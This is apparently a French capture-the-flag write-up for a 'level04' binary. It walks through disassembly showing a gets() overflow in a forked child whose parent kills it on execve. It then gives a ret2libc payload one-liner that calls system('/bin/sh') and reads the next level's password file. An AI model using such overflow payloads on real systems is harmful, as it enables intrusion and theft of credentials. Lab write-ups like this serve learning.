# level 4 #

Dans l'ASM on remarque de suite un appel à la fonction `gets()` qui est vulnérable. 

```
call   prctl@plt            prctl(1);        

call   ptrace@plt           ptrace(0, 0, 0, 0);

call   puts@plt             message qui demande du shellcode

lea    eax, [esp+0x20]
mov    [esp], eax
call   gets@plt             gets(buff) exploitble
```


La question c'est : comment on y arrive, puisqu'il y a un `fork()` avant. La focntion `gets()` est appelée si le pid retourné par `fork()` est égal à 0, donc si on est dans l'enfant.

```
call   fork@plt
mov    DWORD PTR [esp+0xac], eax    sauvegarde du pid retourné

cmp    DWORD PTR [esp+0xac], 0x0
jne    8048769                      si pid != 0 on est dans branche parent
```


On voit aussi des appels à `ptrace()`, dans le parent comme dans l'enfant : le parent trace ce qui se passe dans l'enfant, et notamment si la valeur 11 est retournée... Valeur qui correspond à `execve()`. Si c'est le cas, il tue l'enfant avant qu'on ait notre shell. 
En fait le parent ne fait qu'attendre un changement d'état de l'enfant via `wait()` en boucle.

```
call   wait@plt                     le parent attend un changement d'état de l'enfant
...
call   ptrace@plt                   ptrace(3, pid, 44, 0); lit orig_eax à l'emplacement 44 de l'enfant tracé
mov    DWORD PTR [esp+0xa8],eax
cmp    DWORD PTR [esp+0xa8],0xb     0xb = 11 = execve
jne    8048768                      si différent de 11, boucle sur wait()

call   puts@plt                     sinon, message d'alerte
mov    DWORD PTR [esp+0x4], 0x9           
call   kill@plt                     puis kill(pid, SIGKILL)
```

On doit donc utiliser autre chose que `execve()`... On a la fonction `system()` pour nous sortir de là. 

Enfin on doit trouver l'écart entre le début du buffer récupéré par `gets()` (`tab`) et le saved eip. En soustrayant les deux adresses, on trouve un écart de 156 octets. 

On construit le payload suivant : 

- 156 octets de padding jusqu'au saved EIP
- l'addresse de `system()` dans la libc 
- une adresse au pif (1er argument de system)
- l'adresse de `"/bin/sh"` dans la libc, passée a `system()`


```bash
(python -c 'print ("A"*156 + "\xd0\xae\xe6\xf7" + "\x00\x00\x00\x00" + "\xec\x97\xf8\xf7")' ; echo cat /home/users/level05/.pass) | ./level04
```

Et boom ! Ca fait des chocapiks.
